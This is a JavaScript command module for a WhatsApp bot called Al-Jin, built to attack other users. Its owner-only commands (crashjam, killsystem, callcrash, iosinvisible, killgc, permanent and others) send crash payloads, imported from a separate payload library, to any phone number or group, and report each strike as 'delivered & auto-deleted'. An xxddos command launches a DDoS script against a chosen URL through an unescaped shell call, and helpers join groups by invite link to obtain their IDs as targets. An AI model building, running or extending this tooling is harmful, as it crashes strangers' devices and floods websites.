// ─────────────────────────────────────────────
//  Al-Jin · modules/xeon-commands.js
//  Bug, Crash & DDoS command module (Native Baileys v7 + Binary Vectors)
// ─────────────────────────────────────────────
import { spawn } from 'node:child_process';
import path from 'node:path';
import { isOwner } from '../core/identity.js';
import {
  sendAIRichAddonAction,
  sendQuotaUpsellThinkHard,
  sendCrashJamPayload,
  sendKillSystemPayload,
  sendCrashFinityPayload,
  sendStickerCrashPayload,
  sendCallCrashPayload,
  sendXdelayPayload,
  sendIosInvisiblePayload,
  sendPermanentCrashPayload,
  sendToxicVCardPayload,
  sendMaliciousPDFPayload,
  sendMaliciousJPEGPayload,
  sendToxicStickerPayload,
  isProtectedJid
} from '../lib/bug-payloads.js';

function isAllowed(msg) {
  const sender = msg.key.participant || msg.key.remoteJid;
  return msg.key.fromMe || isOwner(sender);
}

function cleanNumber(input) {
  return (input || '').replace(/[^0-9]/g, '');
}

function notifySending(sock, chat, target, cmdName = 'BUG') {
  const caption = `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ${cmdName.toUpperCase()}\n┃ Tᴀʀɢᴇᴛ : ${target}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
  return sock.sendMessage(chat, { text: caption });
}

async function notifyResult(sock, chat, target, cmdName, result, quotedMsg) {
  if (result && result.success) {
    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED & AUTO-DELETED\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
  } else {
    const errReason = result?.errors?.[0] || 'Payload delivery rejected by target server/device';
    const text = `┏━━━━━━〣 𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ ❌ Status  : UNDELIVERED\n┃ ⚠️ Reason  : ${errReason}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
  }
}

async function checkWhatsAppUser(sock, cleanTarget) {
  if (!cleanTarget) return false;
  try {
    const res = await sock.onWhatsApp(cleanTarget);
    if (!res || !res.length) return true; // Fallback if WhatsApp user lookup is restricted
    const existsObj = Array.isArray(res) ? res[0] : res;
    return Boolean(existsObj && existsObj.exists !== false);
  } catch (e) {
    return true; // Fallback if lookup fails
  }
}

// ─────────────────────────────────────────────
// Commands (Native Baileys v7 + Binary Crash Payloads)
// ─────────────────────────────────────────────

export async function crashjamCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crashjam <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'crashjam');
    const res = await sendCrashJamPayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'crashjam', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'crashjam', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function killsystemCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .killsystem <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'killsystem');
    const res = await sendKillSystemPayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'killsystem', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'killsystem', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function crashfinityCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crashfinity <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'crashfinity');
    const res = await sendCrashFinityPayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'crashfinity', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'crashfinity', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function stickercrashCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .stickercrash <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'stickercrash');
    const res = await sendToxicStickerPayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'stickercrash', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'stickercrash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function callcrashCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .callcrash <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'callcrash');
    const res = await sendCallCrashPayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'callcrash', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'callcrash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xdelayCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xdelay <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'xdelay');
    const res = await sendXdelayPayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'xdelay', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'xdelay', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xbetainvisCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xbetainvis <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'xbetainvis');
    const res = await sendIosInvisiblePayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'xbetainvis', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'xbetainvis', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function iosinvisibleCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .iosinvisible <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'iosinvisible');
    const res = await sendIosInvisiblePayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'iosinvisible', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'iosinvisible', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xgroupCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xgroup <groupJid>\nExample: .xgroup 123456789@g.us' }, { quoted: msg });

  const targetJid = args[0].trim();
  if (!targetJid.endsWith('@g.us')) {
    return sock.sendMessage(chat, { text: '❌ Invalid group JID (must end with @g.us)' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetJid, 'xgroup');
    const res = await sendKillSystemPayload(sock, targetJid);
    await notifyResult(sock, chat, targetJid, 'xgroup', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetJid, 'xgroup', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function killgcCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .killgc <groupJid>' }, { quoted: msg });

  const targetJid = args[0].trim();
  if (!targetJid.endsWith('@g.us')) {
    return sock.sendMessage(chat, { text: '❌ Invalid group JID (must end with @g.us)' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetJid, 'killgc');
    const res = await sendPermanentCrashPayload(sock, targetJid);
    await notifyResult(sock, chat, targetJid, 'killgc', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetJid, 'killgc', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function trashsysgpCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .trashsysgp <groupJid>' }, { quoted: msg });

  const targetJid = args[0].trim();
  if (!targetJid.endsWith('@g.us')) {
    return sock.sendMessage(chat, { text: '❌ Invalid group JID' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetJid, 'trashsysgp');
    const res = await sendPermanentCrashPayload(sock, targetJid);
    await notifyResult(sock, chat, targetJid, 'trashsysgp', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetJid, 'trashsysgp', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function testCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .test <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, cleanTarget, 'test');
    const res = await sendToxicVCardPayload(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'test', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'test', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function killCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .kill <number or groupJid>' }, { quoted: msg });

  const targetArg = args[0].trim();
  const targetJid = targetArg.endsWith('@g.us') ? targetArg : `${cleanNumber(targetArg)}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetArg, 'kill');
    const res = await sendKillSystemPayload(sock, targetJid);
    await notifyResult(sock, chat, targetArg, 'kill', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetArg, 'kill', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function crashCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crash <number or groupJid>' }, { quoted: msg });

  const targetArg = args[0].trim();
  const targetJid = targetArg.endsWith('@g.us') ? targetArg : `${cleanNumber(targetArg)}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetArg, 'crash');
    const res = await sendPermanentCrashPayload(sock, targetJid);
    await notifyResult(sock, chat, targetArg, 'crash', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetArg, 'crash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function permanentCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .permanent <number or groupJid>' }, { quoted: msg });

  const targetArg = args[0].trim();
  const targetJid = targetArg.endsWith('@g.us') ? targetArg : `${cleanNumber(targetArg)}@s.whatsapp.net`;

  if (isProtectedJid(sock, targetJid)) {
    return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetArg, 'permanent multi-vector crash');
    const res = await sendPermanentCrashPayload(sock, targetJid);
    await notifyResult(sock, chat, targetArg, 'permanent crash', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetArg, 'permanent crash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xxddosCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (args.length < 2) {
    return sock.sendMessage(chat, { text: '❌ Usage: .xxddos <url> <timeInSeconds>\nExample: .xxddos https://example.com 60' }, { quoted: msg });
  }

  const targetUrl = args[0];
  const timeSec = args[1];

  await sock.sendMessage(chat, {
    text: `⚡ *Attacking Target*\n\n🎯 Target: \`${targetUrl}\`\n⏱ Time: \`${timeSec}\` seconds\n\n⚙️ Process started...`
  }, { quoted: msg });

  const ddosScript = path.join(process.cwd(), 'lib', 'ddos.js');
  spawn(`node "${ddosScript}" "${targetUrl}" "${timeSec}"`, {
    shell: true,
    stdio: 'inherit'
  });
}

export async function groupidCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: 'Usage: .groupid <group link>\nExample: .groupid https://chat.whatsapp.com/ABC123XYZ' }, { quoted: msg });
  }

  const inviteLink = args[0].trim();
  if (!inviteLink.includes('chat.whatsapp.com/')) {
    return sock.sendMessage(chat, { text: 'Invalid WhatsApp group link.' }, { quoted: msg });
  }

  const inviteCode = inviteLink.split('chat.whatsapp.com/')[1]?.trim();
  if (!inviteCode) return sock.sendMessage(chat, { text: 'Link format incorrect.' }, { quoted: msg });

  try {
    const result = await sock.groupAcceptInvite(inviteCode);
    if (!result) return sock.sendMessage(chat, { text: 'Failed to join or invalid invite code.' }, { quoted: msg });

    const groupJid = typeof result === 'string' ? result : result.gid;
    const meta = await sock.groupMetadata(groupJid);

    let text = `Group Info:\n\n`;
    text += `Name: ${meta.subject || 'No Name'}\n`;
    text += `JID: ${groupJid}\n`;
    text += `Members: ${meta.participants?.length || '?'}\n`;

    await sock.sendMessage(chat, { text }, { quoted: msg });
  } catch (err) {
    sock.sendMessage(chat, { text: `Error fetching group info: ${err.message}` }, { quoted: msg });
  }
}

export async function listgcCommand(sock, chat, msg) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });

  try {
    const groupsObj = await sock.groupFetchAllParticipating();
    const groups = Object.values(groupsObj);

    if (groups.length === 0) {
      return sock.sendMessage(chat, { text: '❌ No WhatsApp groups found.' }, { quoted: msg });
    }

    let output = `⬣ *WHATSAPP GROUPS (${groups.length} total)*\n\n`;
    let index = 1;

    for (const group of groups) {
      output += `❏ Group ${index++}\n`;
      output += `│⭔ *Name:* ${group.subject || 'Unnamed'}\n`;
      output += `│⭔ *ID:* \`${group.id}\`\n`;
      output += `│⭔ *Members:* ${group.participants?.length || 0}\n`;
      output += `╰──────────────\n\n`;
    }

    await sock.sendMessage(chat, { text: output }, { quoted: msg });
  } catch (err) {
    sock.sendMessage(chat, { text: `⚠️ Failed to fetch groups: ${err.message}` }, { quoted: msg });
  }
}
